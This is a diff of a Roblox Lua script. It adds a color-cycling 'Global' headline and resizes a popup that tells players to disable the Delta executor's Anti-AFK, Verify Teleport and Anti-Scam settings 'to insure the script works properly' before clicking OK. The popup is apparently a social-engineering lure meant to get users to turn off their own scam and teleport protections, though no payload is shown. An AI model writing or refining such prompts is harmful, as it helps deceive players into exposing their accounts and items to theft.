@@ -4,8 +4,8 @@ screenGui.ResetOnSpawn = false
 screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
 
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 400, 0, 200)
-frame.Position = UDim2.new(0.5, -200, 0.5, -100)
+frame.Size = UDim2.new(0, 400, 0, 280)
+frame.Position = UDim2.new(0.5, -200, 0.5, -140)
 frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 frame.BorderSizePixel = 0
 frame.Parent = screenGui
@@ -14,9 +14,30 @@ local corner = Instance.new("UICorner")
 corner.CornerRadius = UDim.new(0, 8)
 corner.Parent = frame
 
+-- Headline "Global" with RGB color cycling
+local headline = Instance.new("TextLabel")
+headline.Size = UDim2.new(1, 0, 0, 30)
+headline.Position = UDim2.new(0, 0, 0, 0)
+headline.BackgroundTransparency = 1
+headline.Text = "Global"
+headline.Font = Enum.Font.SourceSansBold
+headline.TextSize = 24
+headline.TextStrokeTransparency = 0.8
+headline.Parent = frame
+
+local RunService = game:GetService("RunService")
+local t = 0
+RunService.Heartbeat:Connect(function(delta)
+    t = t + delta * 2 -- speed of color change
+    local r = (math.sin(t) + 1) / 2
+    local g = (math.sin(t + 2 * math.pi / 3) + 1) / 2
+    local b = (math.sin(t + 4 * math.pi / 3) + 1) / 2
+    headline.TextColor3 = Color3.new(r, g, b)
+end)
+
 local message = Instance.new("TextLabel")
-message.Size = UDim2.new(1, -20, 1, -60)
-message.Position = UDim2.new(0, 10, 0, 10)
+message.Size = UDim2.new(1, -20, 1, -100)
+message.Position = UDim2.new(0, 10, 0, 40)
 message.BackgroundTransparency = 1
 message.TextWrapped = true
 message.TextXAlignment = Enum.TextXAlignment.Left
@@ -24,12 +45,12 @@ message.TextYAlignment = Enum.TextYAlignment.Top
 message.Font = Enum.Font.SourceSansBold
 message.TextSize = 18
 message.TextColor3 = Color3.fromRGB(255, 255, 255)
-message.Text = "Turn off all Delta settings:\n1. Disable Anti-AFK\n2. Disable Verify Teleport\n3. Disable Anti-Scam\n\nAfter disabling, press OK to continue."
+message.Text = "To insure the script works properly\n\nTurn off all Delta settings:\n\n1. Disable Anti-AFK\n2. Disable Verify Teleport\n3. Disable Anti-Scam\n\nAfter disabling, press OK to continue."
 message.Parent = frame
 
 local okButton = Instance.new("TextButton")
 okButton.Size = UDim2.new(0, 100, 0, 40)
-okButton.Position = UDim2.new(0.5, -50, 1, -50)
+okButton.Position = UDim2.new(0.5, -50, 1, -45)
 okButton.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
 okButton.Font = Enum.Font.SourceSansBold
 okButton.TextSize = 20
